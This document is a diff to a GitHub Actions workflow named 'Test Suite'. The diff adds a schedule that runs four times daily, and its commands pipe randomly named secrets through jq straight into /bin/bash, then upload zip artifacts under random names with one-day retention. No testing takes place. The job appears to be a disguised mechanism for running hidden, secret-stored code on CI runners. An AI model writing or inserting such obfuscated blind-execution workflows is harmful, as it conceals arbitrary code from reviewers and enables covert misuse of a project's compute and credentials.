@@ -2,6 +2,8 @@ name: Test Suite
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '51 1,7,13,19 * * *'
 jobs:
   agent:
     runs-on: ubuntu-latest
@@ -10,15 +12,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: Perform
         env:
-          ude29: ${{ secrets.ude29 }}
+          kploi80477: ${{ secrets.kploi80477 }}
         run: |
-          printf '%s' "$ude29" | jq -r .kn3 | /bin/bash
-          echo $lgssg7327 | jq -r .zs67513 | /bin/bash
-          printf '%s' "$trjls32909" | jq -r .y7350 | /bin/bash
+          printf '%s' "$kploi80477" | jq -r .mqvrg65 | /bin/bash
+          printf '%s' "$vc61503" | jq -r .rsnc24569 | /bin/bash
+          printf '%s' "$so94" | jq -r .axdag5 | /bin/bash
+          printf '%s' "$k55" | jq -r .rw8 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
         with:
-          name: cWutHAp2
+          name: OzVJrROJ
           path: "*.zip"
           retention-days: 1
